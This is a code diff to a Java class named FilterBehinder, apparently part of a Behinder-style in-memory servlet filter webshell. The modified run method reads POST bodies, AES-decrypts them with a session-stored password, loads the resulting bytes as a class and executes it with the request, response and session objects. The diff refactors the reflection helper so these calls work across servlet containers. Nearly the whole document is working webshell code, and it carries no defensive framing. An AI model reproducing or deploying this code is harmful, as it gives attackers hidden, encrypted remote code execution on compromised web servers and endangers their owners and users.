@@ -31,21 +31,21 @@ public class FilterBehinder implements InvocationHandler {
 
     private void run(Object servletRequest, Object servletResponse, Object filterChain) {
         try {
-            String method = (String) invokeMethod(servletRequest.getClass(), servletRequest, "getMethod", new Class[]{}, new Object[]{});
+            String method = (String) invokeMethod(servletRequest, "getMethod", new Class[]{}, new Object[]{});
             if (!method.equalsIgnoreCase("POST"))
                 return;
-            Object session = invokeMethod(servletRequest.getClass().getSuperclass(), servletRequest, "getSession", new Class[]{}, new Object[]{});
+            Object session = invokeMethod(servletRequest, "getSession", new Class[]{}, new Object[]{});
             Map<String, Object> pageContext = new HashMap<String, Object>();
             pageContext.put("session", session);
             pageContext.put("request", servletRequest);
             pageContext.put("response", servletResponse);
-            invokeMethod(session.getClass(), session, "putValue", new Class[]{String.class, Object.class}, new Object[]{"u", pass});
+            invokeMethod(session, "putValue", new Class[]{String.class, Object.class}, new Object[]{"u", pass});
 
             Object c = invokeMethod(Class.forName("javax.crypto.Cipher"), null, "getInstance", new Class[]{String.class}, new Object[]{"AES"});
-            invokeMethod(c.getClass(), c, "init", new Class[]{int.class, Class.forName("java.security.Key")}, new Object[]{2, Class.forName("javax.crypto.spec.SecretKeySpec").getDeclaredConstructor(byte[].class, String.class).newInstance(pass.getBytes(), "AES")});
-            Object reader = invokeMethod(servletRequest.getClass(), servletRequest, "getReader", new Class[]{}, new Object[]{});
-            String str = (String) invokeMethod(reader.getClass(), reader, "readLine", new Class[]{}, new Object[]{});
-            byte[] bytes = (byte[]) invokeMethod(c.getClass(), c, "doFinal", new Class[]{byte[].class}, new Object[]{base64(str)});
+            invokeMethod(c, "init", new Class[]{int.class, Class.forName("java.security.Key")}, new Object[]{2, Class.forName("javax.crypto.spec.SecretKeySpec").getDeclaredConstructor(byte[].class, String.class).newInstance(pass.getBytes(), "AES")});
+            Object reader = invokeMethod(servletRequest, "getReader", new Class[]{}, new Object[]{});
+            String str = (String) invokeMethod(reader, "readLine", new Class[]{}, new Object[]{});
+            byte[] bytes = (byte[]) invokeMethod(c, "doFinal", new Class[]{byte[].class}, new Object[]{base64(str)});
 
             Class clazz = defClass(bytes);
             clazz.newInstance().equals(pageContext);
@@ -87,6 +87,14 @@ public class FilterBehinder implements InvocationHandler {
                 field = getField(clazz.getSuperclass(), fieldName);
         }
         return field;
+    }
+
+    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        try {
+            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
+        }catch (Exception e){
+            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
+        }
     }
 
     public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
